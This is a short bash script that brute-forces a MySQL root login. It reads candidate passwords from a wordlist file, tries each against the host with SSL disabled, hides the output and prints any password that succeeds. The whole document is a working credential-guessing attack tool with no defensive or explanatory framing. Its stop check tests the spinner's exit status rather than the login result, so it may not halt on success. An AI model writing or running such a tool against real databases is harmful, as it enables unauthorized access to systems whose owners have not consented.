#!/bin/bash

# Variables
host="localhost"
user="root"
password_file="passwords.txt"

# Function to attempt login
attempt_login() {
    local password=$1
    mysql_config="mysql --host=$host --user=$user --password=$password --ssl-mode=DISABLED"

    # Attempt to connect to MySQL and suppress output
    if echo "QUIT" | $mysql_config &> /dev/null; then
        echo -e "\nSuccess! Password is: $password"
        return 0
    else
        return 1
    fi
}

# Function to show a loading spinner
show_spinner() {
    local pid=$!
    local delay=0.1
    local spinstr='|/-\'
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Brute force function
brute_force() {
    while IFS= read -r password; do
        attempt_login "$password" &
        show_spinner
        if [ $? -eq 0 ]; then
            break
        fi
    done < "$password_file"
}

# Main execution
if [ -f "$password_file" ]; then
    brute_force
else
    echo "Password file not found."
fi
